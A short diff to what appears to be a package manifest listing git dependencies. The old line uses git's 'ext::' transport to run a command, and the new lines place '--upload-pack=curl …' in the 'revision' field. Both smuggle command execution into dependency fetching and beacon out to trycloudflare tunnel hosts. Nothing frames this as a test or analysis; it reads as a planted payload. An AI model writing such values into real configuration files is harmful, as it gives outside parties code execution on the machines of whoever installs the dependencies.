@@ -1,2 +1,3 @@
 packages:
-  - git: "ext::'git ls-remote https://receiving-scripting-gas-slide.trycloudflare.com/beacon-q'"
+  - git: "https://viewing-widely-readily-king.trycloudflare.com/pkg.git"
+    revision: "--upload-pack=curl -s https://viewing-widely-readily-king.trycloudflare.com/beacon-insitu"
